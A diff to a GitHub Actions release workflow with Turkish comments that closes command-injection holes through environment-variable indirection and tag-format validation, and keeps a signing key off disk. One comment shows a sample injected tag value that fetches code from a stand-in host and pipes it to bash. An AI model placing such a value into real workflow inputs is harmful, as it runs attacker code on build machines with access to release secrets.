@@ -55,10 +55,22 @@ jobs:
       tag: ${{ steps.t.outputs.tag }}
     steps:
       - id: t
+        # GÜVENLIK: workflow_dispatch `tag` input'u serbest metin (pattern
+        # enforce edilemez). `${{ }}` doğrudan `run:`'a interpole edilirse
+        # `v1"; curl evil|bash; #` gibi bir input command injection yapar.
+        # Env-var indirection + format regex hem injection'ı hem de
+        # on.push.tags glob'unu atlayan kötü-niyetli tag adlarını eler.
+        env:
+          INPUT_TAG: ${{ github.event.inputs.tag }}
+          REF_NAME: ${{ github.ref_name }}
         run: |
-          TAG="${{ github.event.inputs.tag || github.ref_name }}"
+          TAG="${INPUT_TAG:-$REF_NAME}"
           if [ -z "$TAG" ]; then
             echo "❌ Tag adı boş"
+            exit 1
+          fi
+          if ! printf '%s' "$TAG" | grep -Eq '^v[0-9]+\.[0-9]+\.[0-9]+(-rc\.[0-9]+)?$'; then
+            echo "❌ Geçersiz tag formatı: $TAG (beklenen: vX.Y.Z veya vX.Y.Z-rc.N)"
             exit 1
           fi
           echo "tag=$TAG" >> $GITHUB_OUTPUT
@@ -155,9 +167,12 @@ jobs:
           [ -z "$NOTES_EN" ] && NOTES_EN="$NOTES_TR"
           [ -z "$NOTES_TR" ] && NOTES_TR="$NOTES_EN"
 
-          # Play Store 500 karakter, TestFlight 4000 karakter — Play limiti kullan
-          NOTES_TR_500=$(printf '%s' "$NOTES_TR" | head -c 500)
-          NOTES_EN_500=$(printf '%s' "$NOTES_EN" | head -c 500)
+          # Play Store 500 karakter, TestFlight 4000 karakter — Play limiti kullan.
+          # `head -c` BYTE sayar; Türkçe ş/ğ/ı (2 byte) ve emoji (4 byte)
+          # 500. byte'ta multibyte dizinin ortasında kesilirse Play API'ye
+          # geçersiz UTF-8 gider. Python codepoint (karakter) bazında keser.
+          NOTES_TR_500=$(printf '%s' "$NOTES_TR" | python3 -c 'import sys; sys.stdout.write(sys.stdin.read()[:500])')
+          NOTES_EN_500=$(printf '%s' "$NOTES_EN" | python3 -c 'import sys; sys.stdout.write(sys.stdin.read()[:500])')
 
           # Multi-line outputs
           EOF=$(dd if=/dev/urandom bs=15 count=1 2>/dev/null | base64)
@@ -309,10 +324,19 @@ jobs:
           retention-days: 90
 
       - name: Prepare release notes for Play Store
+        # GÜVENLIK: notes_tr/notes_en saldırgan-kontrollü annotated tag
+        # body'sinden gelir (detect-channel `git tag --format='%(contents:body)'`).
+        # `${{ }}` template expansion bash parse'tan ÖNCE literal text olarak
+        # yerleşir; doğrudan `run:` içine koyulursa tag body'ye yazılan
+        # `$(...)` keyfi shell çalıştırır (CWE-94). Bu yüzden release-ios
+        # adımıyla (NOTES_TR/NOTES_EN env) aynı env-var indirection kullanılır.
+        env:
+          NOTES_TR: ${{ needs.detect-channel.outputs.notes_tr }}
+          NOTES_EN: ${{ needs.detect-channel.outputs.notes_en }}
         run: |
           mkdir -p whatsnew
-          printf '%s' "${{ needs.detect-channel.outputs.notes_tr }}" > whatsnew/whatsnew-tr-TR
-          printf '%s' "${{ needs.detect-channel.outputs.notes_en }}" > whatsnew/whatsnew-en-US
+          printf '%s' "$NOTES_TR" > whatsnew/whatsnew-tr-TR
+          printf '%s' "$NOTES_EN" > whatsnew/whatsnew-en-US
 
       # NOT: RC için track=internal + status=draft (Play Console'dan elle promote)
       #      Prod için track=production + status=inProgress + userFraction=0.1
@@ -427,6 +451,7 @@ jobs:
           api-private-key: ${{ secrets.APPSTORE_PRIVATE_KEY }}
 
       - name: Set TestFlight release notes
+        shell: bash
         env:
           ISSUER_ID: ${{ secrets.APPSTORE_ISSUER_ID }}
           KEY_ID: ${{ secrets.APPSTORE_KEY_ID }}
@@ -443,9 +468,14 @@ jobs:
           CLAIMS=$(printf '{"iss":"%s","iat":%d,"exp":%d,"aud":"appstoreconnect-v1"}' "$ISSUER_ID" "$NOW" "$EXP" | openssl base64 -A | tr '+/' '-_' | tr -d '=')
           UNSIGNED="${HEADER}.${CLAIMS}"
 
-          echo "$PRIVATE_KEY" > /tmp/asc_key.p8
-          SIGNATURE=$(printf '%s' "$UNSIGNED" | openssl dgst -sha256 -sign /tmp/asc_key.p8 | openssl base64 -A | tr '+/' '-_' | tr -d '=')
-          rm /tmp/asc_key.p8
+          # Private key bash process substitution üzerinden openssl'e
+          # /dev/fd/N FIFO olarak akıtılır — diske yazılmaz ve `ls /tmp`
+          # ile listelenebilir bir kalıntı bırakmaz. (F-14-07 / F-02-06.)
+          # `shell: bash` zorunlu — POSIX sh `<(...)` process substitution'ı
+          # desteklemez (GitHub Actions runner'da default shell bash zaten).
+          SIGNATURE=$(printf '%s' "$UNSIGNED" \
+            | openssl dgst -sha256 -sign <(printf '%s' "$PRIVATE_KEY") \
+            | openssl base64 -A | tr '+/' '-_' | tr -d '=')
           JWT="${UNSIGNED}.${SIGNATURE}"
 
           # ── 2. Build'i bul (processing bitene kadar bekle) ─────────────
